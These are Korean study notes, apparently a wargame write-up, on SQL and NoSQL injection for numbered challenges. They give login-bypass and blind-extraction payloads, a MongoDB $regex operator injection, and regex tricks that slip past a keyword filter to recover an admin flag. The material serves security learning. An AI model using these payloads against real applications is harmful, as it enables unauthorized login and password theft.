# 주입: SQL / NoSQL

## SQL Injection

입력이 질의 **구조**에 섞이면 조건·주석·논리식을 공격자가 바꿀 수 있다.

### simple_sqli (#24)

질의가 **큰따옴표**로 감싸는 형태:

```sql
... WHERE userid="{userid}" AND userpassword="{userpassword}"
```

| 페이로드 | 결과 |
|----------|------|
| `admin'--` | `'` 는 문자열 내부 문자 → 실패하기 쉬움 |
| `admin";--` | `"` 를 닫고 이후를 주석 → admin 로그인 |

`OR 1=1` 은 다른 행(guest 등)이 먼저 잡힐 수 있어, admin을 고정하는 편이 안전하다.

### Blind SQLi

결과 집합이 안 보이고 **참/거짓 반응**(exists 등)만 있을 때.

```text
admin' and char_length(upw)=N-- -
admin' and substr(upw,i,1)='c'-- -
```

길이 → 글자 단위로 좁힌다. 유닛: Exercise Blind SQL Injection 등.

## NoSQL Injection

MongoDB 등에서 입력이 연산자 객체로 들어가면 “동등 비교”가 “패턴 비교”로 바뀔 수 있다.

```js
// 의도: { uid: "admin", upw: "비밀" }
// 주입 예: upw[$regex] = "^a"
{ uid: "admin", upw: { $regex: "^a" } }
```

`^a` 매칭 시 로그인 성공 반응 → 첫 글자가 `a`임을 알 수 있다.

### Mango (#90)

- 목표: admin의 `upw` (플래그, `DH{...}` 형태)
- 필터: 요청에 `admin`, `dh`, `admi` 등 포함 시 차단
- uid: `uid[$regex]=ad.in` 등으로 우회
- upw에 `DH` 를 그대로 쓰면 `dh` 필터에 걸림 → `D.{` + 내부 32자 등 패턴으로 회피
